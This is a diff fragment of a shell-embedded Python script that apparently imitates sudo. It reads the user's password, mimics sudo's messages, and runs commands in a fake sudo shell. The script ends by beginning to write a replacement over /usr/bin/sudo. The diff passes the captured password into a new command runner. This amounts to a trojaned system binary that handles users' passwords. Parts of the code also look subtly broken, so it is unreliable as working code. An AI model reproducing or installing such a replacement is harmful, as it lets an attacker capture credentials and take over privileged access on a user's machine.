@@ -32,10 +32,10 @@ def main():
         stdout, stderr = command.communicate(password)
         output = str(command).split()
         if(output[2] == '0'):
-            runShell()
+            runShell(password)
         else:
             print(user+" is not in the sudoers file. This incident will be reported.")
-def runShell():
+def runShell(password):
     cont = True
     directory = "~"
     host = socket.gethostname()
@@ -48,7 +48,17 @@ def runShell():
             return
         else:
             command = "sudo "+option
-            os.system(command)
+            runCommand(password, command)
+def runCommand(password, command):
+    proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    encoded = password.encode('utf-8')
+    stdout, stderr = proc.communicate(encoded)
+    if proc.returncode != 0:
+        print(stderr)
+    else:
+        print(stdout)
+        if stderr:
+            print(stderr)
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
